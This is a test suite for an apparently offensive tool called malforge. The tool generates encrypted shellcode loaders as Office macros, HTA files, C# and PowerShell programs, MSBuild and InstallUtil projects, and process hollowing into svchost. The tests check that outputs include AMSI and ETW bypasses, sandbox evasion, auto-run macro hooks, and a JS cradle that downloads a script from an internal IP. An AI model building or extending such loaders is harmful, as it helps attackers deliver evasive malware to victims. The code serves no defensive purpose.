import os
import re
import tempfile
import pytest
from malforge.crypt import chain
from malforge.emit import render
from malforge.forge import COMPAT


SC = os.urandom(256)

_ALL_PLACEHOLDERS = re.compile(r'__[A-Z_]+__')


def _gen(fmt, methods, **kw):
    enc, meta = chain(SC, methods)
    return render(fmt, enc, meta, **kw)


def _no_placeholders(out, label=''):
    found = _ALL_PLACEHOLDERS.findall(out)
    assert not found, f'unfilled placeholders {label}: {found}'


# Targeted combos that actually break things -- VBA can't do AES natively,
# HTA sandbox has Win11 quirks, process hollowing + XOR needs svchost path,
# chaining order matters for variable naming, etc.

def test_vba_xor_amsi():
    """VBA + XOR + AMSI is the trickiest VBA path (declares + bypass + decrypt)."""
    out = _gen('macro', ['xor'], amsi=True)
    _no_placeholders(out, 'macro/xor/amsi')
    assert 'LoadLibrary' in out
    assert 'Xor' in out

def test_vba_caesar_sandbox():
    out = _gen('macro', ['caesar'], sandbox=True)
    _no_placeholders(out, 'macro/caesar/sandbox')
    assert 'Timer' in out

def test_hta_xor_sandbox():
    """HTA sandbox evasion -- the flaky Win11 path."""
    out = _gen('hta', ['xor'], sandbox=True)
    _no_placeholders(out, 'hta/xor/sandbox')
    assert '<html>' in out

def test_hollow_xor_all_evasion():
    """Process hollowing with everything enabled."""
    out = _gen('hollow', ['xor'], amsi=True, etw=True, sandbox=True)
    _no_placeholders(out, 'hollow/xor/all')
    assert 'svchost' in out
    assert 'Etw' in out

def test_exe_aes_etw():
    """AES needs crypto imports; ETW needs LoadLibrary -- both in same output."""
    out = _gen('exe', ['aes'], etw=True)
    _no_placeholders(out, 'exe/aes/etw')
    assert 'CreateDecryptor' in out
    assert 'using System.Security.Cryptography;' in out
    assert 'Etw' in out

def test_ps1_rc4_amsi_etw():
    """PS1 with RC4 + both bypass patches."""
    out = _gen('ps1', ['rc4'], amsi=True, etw=True)
    _no_placeholders(out, 'ps1/rc4/amsi+etw')
    assert '_mfS0' in out
    assert 'Etw' in out

def test_msbuild_aes_amsi():
    """MSBuild needs XML Using node for crypto + AMSI imports."""
    out = _gen('msbuild', ['aes'], amsi=True)
    _no_placeholders(out, 'msbuild/aes/amsi')
    assert '<Using Namespace="System.Security.Cryptography"' in out
    assert 'LoadLibrary' in out

def test_installutil_chain_xor_caesar():
    """Two-method chain on installutil -- variable naming edge case."""
    out = _gen('installutil', ['xor', 'caesar'])
    _no_placeholders(out, 'installutil/xor+caesar')
    assert '_mf_s0' in out

def test_exe_no_encryption():
    """No encryption should rename enc -> buf everywhere."""
    out = _gen('exe', [])
    _no_placeholders(out, 'exe/none')
    assert 'byte[] buf =' in out
    assert 'byte[] enc =' not in out

def test_js_cradle():
    out = _gen('js', [], payload_url='http://10.0.0.1/s.ps1')
    _no_placeholders(out, 'js')
    assert 'http://10.0.0.1/s.ps1' in out


# Structural checks that actually caught bugs during dev

class TestCsStructure:
    @pytest.mark.parametrize('fmt', ['exe', 'hollow', 'dll', 'installutil'])
    def test_cs_has_namespace(self, fmt):
        out = _gen(fmt, ['xor'])
        assert 'namespace ' in out

    @pytest.mark.parametrize('fmt', ['exe', 'hollow', 'dll', 'installutil'])
    def test_cs_no_encryption_buf_not_enc(self, fmt):
        out = _gen(fmt, [])
        assert 'byte[] buf =' in out
        assert 'byte[] enc =' not in out

    @pytest.mark.parametrize('fmt', ['exe', 'dll', 'installutil'])
    def test_cs_rw_then_rx(self, fmt):
        out = _gen(fmt, ['xor'])
        assert '0x04' in out  # PAGE_READWRITE
        assert '0x20' in out  # PAGE_EXECUTE_READ

    @pytest.mark.parametrize('fmt', ['exe', 'hollow', 'dll', 'installutil'])
    def test_cs_chain_same_method_no_collision(self, fmt):
        out = _gen(fmt, ['xor', 'xor'])
        assert '_mfk0' in out
        assert '_mfk1' in out


class TestVbaStructure:
    def test_has_auto_open(self):
        out = _gen('macro', ['xor'])
        assert 'AutoOpen' in out
        assert 'Document_Open' in out

    def test_amsi_declares(self):
        out = _gen('macro', ['xor'], amsi=True)
        assert 'LoadLibrary' in out
        assert 'CopyMemory' in out

    def test_chain_xor_caesar(self):
        out = _gen('macro', ['xor', 'caesar'])
        assert '_mf_s0' in out
        assert 'buf' in out


class TestPs1Structure:
    def test_rw_then_rx(self):
        out = _gen('ps1', ['xor'])
        assert '0x04' in out
        assert '0x20' in out

    def test_no_rwx_in_alloc(self):
        out = _gen('ps1', ['xor'])
        alloc_lines = [l for l in out.split('\n') if 'VirtualAlloc' in l and '::' in l]
        for line in alloc_lines:
            assert '0x40' not in line, f'RWX allocation found: {line}'

    def test_no_encryption(self):
        out = _gen('ps1', [])
        assert '$buf' in out
        assert '$enc' not in out


class TestChainVariables:
    def test_single_step_enc_to_buf(self):
        out = _gen('exe', ['xor'])
        assert 'byte[] enc =' in out
        assert 'buf[' in out or 'buf =' in out

    def test_two_step_has_intermediate(self):
        out = _gen('exe', ['xor', 'aes'])
        assert '_mf_s0' in out

    def test_four_step_has_three_intermediates(self):
        out = _gen('exe', ['xor', 'aes', 'rc4', 'caesar'])
        assert '_mf_s0' in out
        assert '_mf_s1' in out
        assert '_mf_s2' in out


class TestCliOutputFiles:
    def _run_cli(self, fmt, methods, evasion=None, extra=None):
        import subprocess, sys
        sc = os.urandom(64)
        inp = tempfile.NamedTemporaryFile(suffix='.bin', delete=False)
        inp.write(sc)
        inp.close()

        ext_map = {
            'exe': '.cs', 'hollow': '.cs', 'dll': '.cs', 'installutil': '.cs',
            'macro': '.vba', 'hta': '.hta', 'ps1': '.ps1', 'js': '.js',
            'msbuild': '.csproj',
        }
        out = tempfile.NamedTemporaryFile(suffix=ext_map[fmt], delete=False)
        out.close()

        cmd = [sys.executable, '-m', 'malforge', '-f', fmt, '-i', inp.name, '-o', out.name]
        if methods:
            cmd += ['-e', ','.join(methods)]
        if evasion:
            cmd += evasion
        if extra:
            cmd += extra

        r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        content = open(out.name).read()
        os.unlink(inp.name)
        os.unlink(out.name)
        return r, content

    def test_exe_aes_amsi_etw_sandbox(self):
        r, content = self._run_cli('exe', ['aes'], ['--amsi', '--etw', '--sandbox'])
        assert r.returncode == 0
        assert 'CreateDecryptor' in content
        assert '__' not in content

    def test_hollow_rc4(self):
        r, content = self._run_cli('hollow', ['rc4'])
        assert r.returncode == 0
        assert 'svchost' in content

    def test_macro_xor(self):
        r, content = self._run_cli('macro', ['xor'])
        assert r.returncode == 0
        assert 'AutoOpen' in content

    def test_ps1_xor_amsi_etw(self):
        r, content = self._run_cli('ps1', ['xor'], ['--amsi', '--etw'])
        assert r.returncode == 0
        assert 'Etw' in content

    def test_js_cradle(self):
        import subprocess, sys
        out = tempfile.NamedTemporaryFile(suffix='.js', delete=False)
        out.close()
        cmd = [sys.executable, '-m', 'malforge', '-f', 'js',
               '--url', 'http://10.0.0.1/s.ps1', '-o', out.name]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        content = open(out.name).read()
        os.unlink(out.name)
        assert r.returncode == 0
        assert 'http://10.0.0.1/s.ps1' in content
